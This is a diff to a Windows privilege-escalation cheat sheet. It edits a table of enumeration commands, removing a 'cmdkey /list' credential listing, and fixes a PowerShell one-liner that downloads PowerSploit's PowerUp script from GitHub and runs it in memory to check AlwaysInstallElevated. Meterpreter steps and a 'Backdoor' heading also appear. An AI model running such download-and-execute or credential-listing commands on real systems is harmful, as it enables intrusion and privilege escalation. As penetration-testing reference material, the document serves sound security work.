@@ -29,8 +29,7 @@ current system:
 | **Connected users** | qwinsta | | |
 | **Powershell version**  | Powershell  $psversiontable | $psversiontable ||
 | **Environement variables** | set | Get-ChildItem Env: &#124; ft Key,Value ||
-| **Credential Manager** | cmdkey /list | | |
-| **Mounted disks** | | Get-PSDrive &#124; where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"} | wmic volume get DriveLetter,FileSystem,Capacity |
+| **Mounted disks** | fsutil fsinfo drives | Get-PSDrive &#124; where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"} | wmic volume get DriveLetter,FileSystem,Capacity |
 | **Writable directories** | dir /a-rd /s /b | | |
 | **Writable files** | dir /a-r-d /s /b | | | |
 
@@ -532,8 +531,7 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 # (PowerShell) PowerSploit's PowerUp Get-RegistryAlwaysInstallElevated
-PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
-erSploit/master/Privesc/PowerUp.ps1")
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
 PS> Get-RegistryAlwaysInstallElevated
 
 meterpreter> load powershell
@@ -947,7 +945,7 @@ Windows Subsystem for Linux
 Introduced in Windows 10
 Lets you execute Linux binaries natively on Windows
 
-###### 
+######
 ###### File system
 
 ###### Backdoor
